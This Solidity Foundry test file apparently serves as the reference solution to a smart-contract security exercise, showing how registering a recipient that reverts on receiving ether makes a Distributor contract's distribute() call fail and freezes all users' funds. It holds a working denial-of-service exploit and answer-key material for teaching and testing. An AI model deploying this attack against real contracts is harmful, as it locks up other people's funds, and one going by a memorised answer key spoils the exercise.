// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {Distributor} from "../src/Distributor.sol";

contract AcceptEth {
    receive() external payable {}
}

contract RevertOnReceive {
    receive() external payable {
        revert("no thanks");
    }
}

/// Reference exploit: register one recipient that reverts on receive — the whole
/// distribution then reverts, freezing everyone's funds.
contract DosSolution is Test {
    Distributor dist;

    function setUp() public {
        dist = new Distributor();
        vm.deal(address(dist), 3 ether);
        address honest = address(new AcceptEth());
        vm.prank(honest);
        dist.register();
    }

    function test_exploit() public {
        RevertOnReceive bad = new RevertOnReceive();
        vm.prank(address(bad));
        dist.register();

        (bool ok,) = address(dist).call(abi.encodeWithSignature("distribute()"));
        assertFalse(ok, "a single reverting recipient should brick the distribution");
        assertEq(address(dist).balance, 3 ether, "funds are frozen for everyone");
    }
}
